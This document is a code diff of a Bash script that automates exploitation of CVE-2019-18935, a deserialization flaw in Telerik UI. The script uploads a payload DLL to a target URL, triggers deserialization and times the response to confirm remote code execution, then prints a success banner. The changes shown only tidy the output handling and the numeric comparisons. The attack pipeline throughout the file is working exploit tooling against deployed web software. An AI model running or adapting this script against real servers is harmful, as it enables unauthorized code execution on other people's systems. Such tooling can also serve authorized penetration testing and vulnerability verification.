@@ -197,26 +197,32 @@ stage_versions() {
   fi
 }
 
-# upload + return the remote filename the target reports
-upload_payload() { # $1 dll  $2 ver  $3 folder -> echo remote filename
+# upload + return the remote filename the target reports.
+# Diagnostics go to stderr; ONLY the filename goes to stdout (it is captured).
+upload_payload() { # $1 dll  $2 ver  $3 folder -> echo remote filename (stdout only)
   local dll="$1" ver="$2" folder="$3"
-  log "UPLOAD: $(basename "$dll") -> $folder"
+  log "UPLOAD: $(basename "$dll") -> $folder" >&2
   local out remote
   out=$("$PYTHON" CVE-2019-18935.py -t -u "$TARGET_URL" -v "$ver" -f "$folder" -p "$dll" 2>&1)
-  printf '%s\n' "$out" | sed 's/^/      /'
+  printf '%s\n' "$out" | sed 's/^/      /' >&2
   remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '[^']+'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
   [ -n "$remote" ] || remote=$(printf '%s' "$out" | grep -oE '"TempFileName":"[^"]+"' | head -1 | sed 's/.*"TempFileName":"//; s/"$//')
   printf '%s' "$remote"
 }
 
+# numeric comparison that works on BSD (macOS) and GNU awk-less setups
+num_ge() { # $1 a  $2 b -> exit 0 if a >= b
+  python3 -c "import sys; sys.exit(0 if float(sys.argv[1]) >= float(sys.argv[2]) else 1)" "$1" "$2" 2>/dev/null
+}
+
 # fire the deserialize trigger and echo the measured seconds
 trigger_and_time() { # $1 remote filename  -> echo seconds
   local remote="$1" t0 t1 rt
-  log "TRIGGER: deserializing (sleep payload -> expect ~10s pause)"
+  log "TRIGGER: deserializing (sleep payload -> expect ~10s pause)" >&2
   t0=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
   "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /' || true
   t1=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
-  rt=$(awk "BEGIN{printf \"%.2f\", $t1-$t0}")
+  rt=$(python3 -c "import sys;print(f'{float(sys.argv[1])-float(sys.argv[2]):.2f}')" "$t1" "$t0" 2>/dev/null || echo 0)
   printf '%s' "$rt"
 }
 
@@ -246,7 +252,7 @@ stage_exploit() {
       info "remote file: $remote  (in $folder)"
       rt=$(trigger_and_time "$remote")
       info "response: ${rt}s"
-      if awk "BEGIN{exit !($rt >= 8)}"; then
+      if num_ge "$rt" 8; then
         banner "SUCCESS  -  CVE-2019-18935 CONFIRMED (RCE)"
         info "Target  : $TARGET_URL"
         info "Version : $VERSION"
